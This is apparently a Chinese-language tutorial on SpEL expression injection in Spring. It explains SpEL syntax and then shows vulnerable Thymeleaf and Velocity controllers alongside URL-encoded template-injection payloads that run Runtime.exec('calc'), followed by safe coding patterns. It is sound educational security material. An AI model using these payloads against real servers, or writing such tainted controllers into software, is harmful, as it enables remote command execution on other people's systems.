# SpEL表达式注入
# SpEL简介
在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。
## SpEL定界符
SpEL使用```#{}```作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。这里需要注意#{}和${}的区别：
* ```#{}```就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
* ```${}```主要用于加载外部属性文件中的值；
* 两者可以混合使用，但是必须```#{}```在外面，```${}```在里面，如```#{'${}'}```，注意单引号是字符串类型才添加的；
## SpEL表达式类型
### 字面值
最简单的SpEL表达式就是仅包含一个字面值, 注意若是指定为字符串的话需要添加单引号括起来,Java基本数据类型都可以出现在SpEL表达式中。
```xml
<!--数字-->
<property name="message1" value="#{996}"/>
<!--字符-->
<property name="message2" value="#{'hello world'}"/>
<property name="salary" value="#{1e4}"/>
<!--与字符串混用-->
<property name="message" value="the value is #{996}"/>
```
### 引用Bean、属性和方法
```xml
类属性
#{Person.name}
类方法
#{Person.HelloWorld()}
函数
#{'Guoke'.toLowerCase()}
异常处理: ?.符号会确保左边的表达式不会为null，如果为null的话就不会调用toUpperCase()方法了
#{Person.HelloWorld()?.toUpperCase()}
```
### 类类型表达式T(Type)
在SpEL表达式中，使用T(Type)运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。使用T(Type)来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。
在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：
```xml
<property name="random" value="#{T(java.lang.Math).random()}"/>
```
## SpEL用法
SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。
### XML配置用法
前面的就是以XML配置为例对SpEL表达式的用法进行的说明；
### 注解用法
而注解@Value的用法例子如下：
```java
public class EmailSender {
    @Value("${spring.mail.username}")
    private String mailUsername;
    @Value("#{ systemProperties['user.region'] }")    
    private String defaultLocale;
    //...
}
```
### 代码中使用Expression
SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。
```java
// 创建解析器：SpEL 使用 ExpressionParser 接口表示解析器，提供 SpelExpressionParser 默认实现；
ExpressionParser parser = new SpelExpressionParser();
// 解析表达式：使用 ExpressionParser 的 parseExpression 来解析相应的表达式为 Expression 对象；
Expression expression = parser.parseExpression("('Hello' + ' world').concat(#end)");
// 构造上下文：准备比如变量定义等等表达式需要的上下文数据；
EvaluationContext context = new StandardEvaluationContext();
context.setVariable("end", "!");
//求值：通过 Expression 接口的 getValue 方法根据上下文获得表达式值；
System.out.println(expression.getValue(context));
// 输出： Hello world!
```
主要接口
* ExpressionParser 接口：表示解析器，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpressionParser 类，使用 parseExpression 方法将字符串表达式转换为 Expression 对象，对于 ParserContext 接口用于定义字符串表达式是不是模板，及模板开始与结束字符；
* EvaluationContext 接口：表示上下文环境，默认实现是 org.springframework.expression.spel.support 包中的 StandardEvaluationContext 类，使用 setRootObject 方法来设置根对象，使用 setVariable 方法来注册自定义变量，使用 registerFunction 来注册自定义函数等等。
* Expression 接口：表示表达式对象，默认实现是 org.springframework.expression.spel.standard 包中的 SpelExpression，提供 getValue 方法用于获取表达式值，提供 setValue 方法用于设置对象值。

# SpEL表达式注入漏洞
漏洞原理
SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：
* SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
* StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。
由前面知道，SpEL表达式是可以操作类及其方法的，可以通过类类型表达式T(Type)来调用任意类方法。这是因为在不指定EvaluationContext的情况下默认采用的是StandardEvaluationContext，而它包含了SpEL的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。
## Thymeleaf模板注入分析
参考：https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
```java
//GET /path?lang=en HTTP/1.1
//GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome"; //template path is tainted
}

// thymeleaf 在解析包含 :: 的模板名时，会将其作为表达式去进行执行
//GET /fragment?section=main
//GET /fragment?section=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d__::.x
@GetMapping("/fragment")
public String fragment(@RequestParam String section) {
    return "welcome :: " + section; //fragment is tainted
}

//如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析.
// /doc/__$%7BT(java.lang.Runtime).getRuntime().exec("calc")%7D__::.x
@GetMapping("/doc/{document}")
public void getDocument(@PathVariable String document) {
    log.info("Retrieving " + document);
    //returns void, so view name is taken from URI
}
```
正确使用方式：
```java
// 设置ResponseBody注解,如果设置ResponseBody，则不再调用模板解析
@GetMapping("/safe/fragment")
@ResponseBody
public String safeFragment(@RequestParam String section) {
    return "welcome :: " + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name
}

//设置redirect重定向，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值
@GetMapping("/safe/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; //FP as redirects are not resolved as expressions
}

//由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析
@GetMapping("/safe/doc/{document}")
public void getDocument(@PathVariable String document, HttpServletResponse response) {
    log.info("Retrieving " + document); //FP
}
// 其他
<div th:fragment="main">
    <span th:text="'Hello, ' + ${message}"></span>
    <a th:href="@{__${message}__}" th:title="${message}">
</div>
```
## SSTI of Java velocity
```java
// /velocity?template=%23set($e=%22e%22);$e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc.exe%22)
@GetMapping("/velocity")
public void velocity(String template) {
    Velocity.init();
    VelocityContext context = new VelocityContext();
    context.put("author", "Elliot A.");
    context.put("address", "217 E Broadway");
    context.put("phone", "555-1337");
    StringWriter swOut = new StringWriter();
    Velocity.evaluate(context, swOut, "test", template);
}
```
http://rui0.cn/archives/1043
https://guokeya.github.io/post/413GsNWtr/
https://mrbird.cc/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F.html
https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/